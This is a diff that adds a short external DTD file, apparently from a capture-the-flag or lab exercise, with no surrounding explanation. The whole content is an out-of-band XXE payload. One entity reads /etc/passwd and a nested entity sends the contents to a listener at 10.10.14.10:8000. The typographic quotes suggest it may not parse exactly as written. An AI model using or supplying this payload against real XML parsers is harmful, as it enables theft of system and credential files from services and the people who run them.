@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!ENTITY % delta SYSTEM “file:///etc/passwd”>
+<!ENTITY % bravo “<!ENTITY % charlie SYSTEM
+‘http://10.10.14.10:8000/?%delta;’>”>
